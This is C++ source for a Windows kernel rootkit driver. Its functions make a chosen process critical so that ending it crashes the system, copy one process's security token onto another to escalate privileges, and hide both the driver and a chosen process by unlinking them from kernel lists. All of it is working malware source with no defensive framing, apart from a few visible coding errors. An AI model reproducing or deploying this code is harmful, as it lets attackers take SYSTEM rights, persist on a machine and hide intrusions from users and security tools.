////
//		FUNCTIONS USED TO ELEVATE AND PROTECTS PROCESSES
////
#include "Rootkit.hpp"

NTSTATUS Rootkit::ProtectProcess(DWORD PID)
{
	NTSTATUS status = STATUS_SUCCESS;

	CLIENT_ID clientId;
	HANDLE handle, hToken;

	TOKEN_PRIVILEGES tkp = { 0 };
	OBJECT_ATTRIBUTES objAttr;
	ULONG BreakOnTermination = 1;

	clientId.UniqueThread = NULL;
	clientId.UniqueProcess = ULongToHandle(PID);
	InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);

	status = ZwOpenProcess(&handle, PROCESS_ALL_ACCESS, &objAttr, &clientId);
	if (!NT_SUCCESS(status))
	{
#if DEBUG
		KdPrint(("[-] Failed to open process: %d\n", status));
#endif
		return status;
	}

	status = ZwOpenProcessTokenEx(handle, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, OBJ_KERNEL_HANDLE, &hToken);
	if (!NT_SUCCESS(status))
	{
#if DEBUG
		KdPrint(("[-] Failed to open token\n"));
#endif
		ZwClose(hToken);
		return status;
	}

	tkp.PrivilegeCount = 1;
	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	tkp.Privileges[0].Luid = RtlConvertLongToLuid(SE_DEBUG_PRIVILEGE);

	status = ZwAdjustPrivilegesToken(hToken, FALSE, &tkp, 0, NULL, NULL);
	if (!NT_SUCCESS(status))
	{
#if DEBUG
		KdPrint(("[-] Failed to adjust token\n"));
#endif

		ZwClose(hToken);
		return status;
	}

	status = ZwSetInformationProcess(handle, ProcessBreakOnTermination, &BreakOnTermination, sizeof(ULONG));
	if (!NT_SUCCESS(status))
	{
#if DEBUG
		KdPrint(("[-] Failed to set information process\n"));
#endif

		ZwClose(hToken);
		return status;
	}
#if DEBUG
	KdPrint(("[*] Process successfully set as critical!\n"));
#endif

	tkp.Privileges[0].Luid = RtlConvertLongToLuid(SE_TCB_PRIVILEGE);
	status = ZwSetInformationProcess(handle, ProcessBreakOnTermination, &BreakOnTermination, sizeof(ULONG));
	if (!NT_SUCCESS(status))
	{
#if DEBUG
		KdPrint(("[-] Failed to set information process: nr 2\n"));
#endif
		ZwClose(hToken);
		return status;
	}

#if DEBUG
	KdPrint(("[!] The process has become part of the system!\n"));
	KdPrint(("[!] You won't be able to close the process until next reboot. Closing the process will result in a blue screen\n"));
#endif

	ZwClose(hToken);
	return status;
}

NTSTATUS Rootkit::ProcessElevation(ULONG srcPid, ULONG targetPid)
{
	NTSTATUS status = STATUS_SUCCESS;
	PEPROCESS pTargetProcess, pSrcProcess;

	//Getting target process
	status = PsLookupProcessByProcessId(ULongToHandle(targetPid), &pTargetProcess);
	if (!NT_SUCCESS(status))
	{
#if DEBUG
		KdPrint(("[-] Target PID PsLookup failed\n"));
#endif
		return status;
	}
#if DEBUG
	KdPrint(("[+] Target EProcess address: 0x%p\n", pTargetProcess));
#endif

	//Getting source process
	status = PsLookupProcessByProcessId(ULongToHandle(srcPid), &pSrcProcess);
	if (!NT_SUCCESS(status))
	{
#if DEBUG
		KdPrint(("[-] Source PID PsLookup failed\n"));
#endif
		return status;
	}

#if DEBUG
	KdPrint(("[+] Source EProcess address: 0x%p\n", pSrcProcess));
	KdPrint(("[+] Setting source token to the target token\n"));
#endif

	*(UINT64*)((UINT64)pTargetProcess + (UINT64)TOKEN) = *(UINT64*)(UINT64(pSrcProcess) + (UINT64)TOKEN);

#if DEBUG
	KdPrint(("[*] Source token copied to the target!\n"));
#endif

	return status;
}

VOID Ghost::GhostDriver(PDRIVER_OBJECT DriverObject)
{
#if DEBUG
	KdPrint(("[+] Hiding driver\n"));
#endif

	KIRQL irql = KeRaiseIrqlToDpcLevel();
	PLDR_DATA_TABLE_ENTRY prevEntry, nextEntry, modEntry;
	modEntry = (PLDR_DATA_TABLE_ENTRY)DriverObject->DriverSection;

	prevEntry = (PLDR_DATA_TABLE_ENTRY)modEntry->InLoadOrderLinks.Blink;
	nextEntry = (PLDR_DATA_TABLE_ENTRY)modEntry->InLoadOrderLinks.Flink;

	prevEntry->InLoadOrderLinks.Flink = modEntry->InLoadOrderLinks.Flink;
	nextEntry->InLoadOrderLinks.Blink = modEntry->InLoadOrderLinks.Blink;

	modEntry->InLoadOrderLinks.Flink = (PLIST_ENTRY)modEntry;
	modEntry->InLoadOrderLinks.Blink = (PLIST_ENTRY)modEntry;
	KeLowerIrql(irql);

#if DEBUG
	KdPrint(("[!] Driver hidden!\n"));
#endif
}

////
//		BSOD AVOID USED FROM UNKNOWNCHEATS
////
VOID RemoveTheLinks(PLIST_ENTRY Current)
{
	PLIST_ENTRY Previous, Next;

	Previous = (Current->Blink);
	Next = (Current->Flink);

	Previous->Flink = Next;
	Next->Blink = Previous;

	// Re-write the current LIST_ENTRY to point to itself (avoiding BSOD)
	Current->Blink = (PLIST_ENTRY)&Current->Flink;
	Current->Flink = (PLIST_ENTRY)&Current->Flink;
	return;
}

PCHAR Ghost::GhostProcess(UINT32 pid)
{
#if DEBUG
	KdPrint(("[+] Ghosting process\n"));
#endif

	LPSTR result = (LPSTR)ExAllocatePool(NonPagedPool, sizeof(ULONG) + 20);;

	ULONG PID_OFFSET = ACTIVE_PROCESS_LINKS;

#if DEBUG
	KdPrint(("[+] PID offset: %p\n", PID_OFFSET));
#endif

	ULONG LIST_OFFSET = PID_OFFSET;

	//Checking architecture using pointer size
	INT_PTR ptr;

	// Ptr size 8 if compiled for a 64-bit machine, 4 if compiled for 32-bit machine
	LIST_OFFSET += sizeof(ptr);

	PEPROCESS CurrentEPROCESS = PsGetCurrentProcess();

	PLIST_ENTRY CurrentList = (PLIST_ENTRY)((ULONG_PTR)CurrentEPROCESS + LIST_OFFSET);
	PUINT32 CurrentPID = (PUINT32)((ULONG_PTR)CurrentEPROCESS + PID_OFFSET);

	if (*(UINT32*)CurrentPID == pid) {
		RemoveTheLinks(CurrentList);
		return (PCHAR)result;
	}

	PEPROCESS StartProcess = CurrentEPROCESS;

	CurrentEPROCESS = (PEPROCESS)((ULONG_PTR)CurrentList->Flink - LIST_OFFSET);
	CurrentPID = (PUINT32)((ULONG_PTR)CurrentEPROCESS + PID_OFFSET);
	CurrentList = (PLIST_ENTRY)((ULONG_PTR)CurrentEPROCESS + LIST_OFFSET);

	while ((ULONG_PTR)StartProcess != (ULONG_PTR)CurrentEPROCESS)
	{
		if (*(UINT32*)CurrentPID == pid) {
			RemoveTheLinks(CurrentList);
			return (PCHAR)result;
		}

		CurrentEPROCESS = (PEPROCESS)((ULONG_PTR)CurrentList->Flink - LIST_OFFSET);
		CurrentPID = (PUINT32)((ULONG_PTR)CurrentEPROCESS + PID_OFFSET);
		CurrentList = (PLIST_ENTRY)((ULONG_PTR)CurrentEPROCESS + LIST_OFFSET);
	}

#if DEBUG
	KdPrint(("[!] Process %d ghosted!\n", pid));
#endif
	return (PCHAR)result;
}